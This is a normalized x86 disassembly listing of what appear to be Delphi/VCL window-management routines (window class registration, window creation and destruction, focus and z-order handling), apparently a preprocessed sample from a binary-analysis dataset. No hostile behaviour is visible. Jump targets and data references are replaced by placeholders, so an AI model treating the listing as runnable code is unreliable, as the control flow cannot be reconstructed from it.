add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_44b818
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44c00c
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_4181b4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_418310
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_44b3d8
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_44bfd0
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_41838c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_418310
mov edx eax
mov ecx ebx
mov eax edi
call sub_44b34c
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_44b988
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_44c00c
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_44bfd0
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_44bfd0
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_44b9dc
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_44b988
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44babb
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_44b818
pop ecx
push ebp
mov al 0x2
call sub_44b818
pop ecx
push ebp
mov al 0x3
call sub_44b818
pop ecx
push ebp
mov al 0x4
call sub_44b818
pop ecx
push ebp
mov al 0x5
call sub_44b818
pop ecx
push ebp
mov al 0x6
call sub_44b818
pop ecx
push ebp
xor eax eax
call sub_44b818
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403290
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_40348c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_44bae0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44f5e0
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44bb74
xor eax eax
push ebp
push sub_44bb67
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_44bb7c
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_44bba4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44bc69
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4484f8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_44c00c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bc70
mov eax [ ebp - 0xc ]
call sub_403290
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44bfd0
mov edx eax
mov eax [ ebp - 0xc ]
call sub_4181b4
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_448264
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_418310
xor ecx ecx
mov edx 0xb03e
call sub_449ca8
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44bfd0
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_44bc78
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44c00c
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_44bb74
xor edx edx
push ebp
push sub_44bd5f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_44c00c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44bfd0
mov edx eax
mov eax [ ebp - 0xc ]
call sub_4181b4
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_418310
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403290
mov eax [ ebp - 0x4 ]
call sub_44bb7c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44bfd0
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_448008
mov dl 0x4
call sub_448008
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_418200
sub_44bdcc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_45f870
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_463594
sub_44bdec
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_4473e8
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_4473e8
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_4473e8
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_44be38
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_447410
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_447410
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_447410
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_44be80
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_40348c
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_449ca8
mov edx ebx
mov eax edi
call sub_44bdec
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_449ca8
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_449ca8
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_449ca8
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_449ca8
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_449ca8
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax edi
call sub_44f5e0
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_449ca8
mov eax edi
call sub_44c9d0
jmp r-xdata
mov edx ebx
mov eax edi
call sub_44bae0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44bf54
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_449ca8
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax esi
call sub_44f5e0
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_44bdcc
mov eax ebp
call sub_44c834
jmp r-xdata
mov edx ebx
mov eax esi
call sub_44be38
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_449ca8
mov eax esi
call sub_44bb9c
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_448f3c
sub_44bfd0
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_418310
mov edx edi
mov eax ebp
call sub_418310
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44c02c
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_44c00c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_44bfd0
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_44c06c
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_44c02c
add esp 0x10
retn
sub_44c094
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_44c100
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_449138
test al al
je r-xdata
mov eax ebx
call sub_449168
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_40348c
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_40348c
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_44c168
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_44c286
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402ca4
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44c100
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_44f2dc
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4031e0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40426c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_4086d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c28d
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_44c294
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_44c455
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_4458e8
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_4458e8
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7cc
call sub_403a44
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40cb14
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40cb14
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408870
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_44f5ec
push 0x1
mov eax [ esi + 0x68 ]
call sub_4237fc
mov ecx eax
mov edx 0x30
mov eax esi
call sub_449ca8
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_44f2dc
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c45c
lea eax [ ebp - 0xc0 ]
call sub_404008
retn
mov eax esi
mov si 0xffee
call sub_40348c
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_44c464
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406b90
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_44c4a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41ca50
mov eax esi
call sub_41c9a0
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41c9a0
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_41ca58
pop esi
pop ebx
retn
sub_44c4dc
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41ec5c
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_41eb90
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_41eb90
mov eax esi
call sub_41ec64
add esp 0x10
pop esi
pop ebx
retn
sub_44c544
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_44c530
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_418310
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_418310
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_44c61c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_449fe0
mov eax [ ebp - 0x8 ]
push eax
push sub_44c4a4
mov eax [ ebp - 0x8 ]
push eax
push sub_44c4dc
push ebp
call sub_44c544
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44c678
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_448a68
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408824
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_408838
mov ecx eax
mov edx edi
mov eax ebx
call sub_448a78
mov eax r-xdata
call sub_408844
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_44751c
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_44c6d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_44c71d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c724
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40cb14
sub_44c734
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_41836c
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_418310
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_44c77c
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_44c00c
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_44c734
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_44bfd0
call sub_448148
inc edi
dec esi
jne r-xdata
sub_44c818
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_44c834
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_418310
call sub_44c834
inc edi
dec esi
jne r-xdata
sub_44c894
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_40348c
mov ebx eax
mov eax edi
call sub_44c834
mov eax edi
call sub_44c9d0
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_44c8d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push j_sub_403758#8
push [ fs : eax ]
mov [ fs : eax ] esp
